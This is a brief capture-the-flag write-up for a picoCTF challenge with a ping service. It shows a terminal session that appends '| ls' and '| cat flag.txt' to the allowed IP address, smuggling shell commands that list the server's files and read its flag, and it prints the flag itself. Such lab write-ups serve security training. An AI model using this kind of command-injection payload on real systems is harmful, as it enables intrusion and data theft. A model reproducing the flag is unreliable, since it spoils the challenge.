# Reto
## Descripción
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?You can connect to the service here `nc mysterious-sea.picoctf.net 54495`
## Solución
### Solucion

```
┌──(kali㉿kali)-[~/picoctf/competencia1/ping-cmd]
└─$ nc mysterious-sea.picoctf.net 54495                
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.54 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.49 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.494/9.515/9.536/0.021 ms
                                                                                                                                                                        
┌──(kali㉿kali)-[~/picoctf/competencia1/ping-cmd]
└─$ nc mysterious-sea.picoctf.net 54495
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | ls
flag.txt
script.sh
                                                                                                                                                                        
┌──(kali㉿kali)-[~/picoctf/competencia1/ping-cmd]
└─$ nc mysterious-sea.picoctf.net 54495
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | cat flag.txt
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae} 
```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}
## Notas


## Referencias
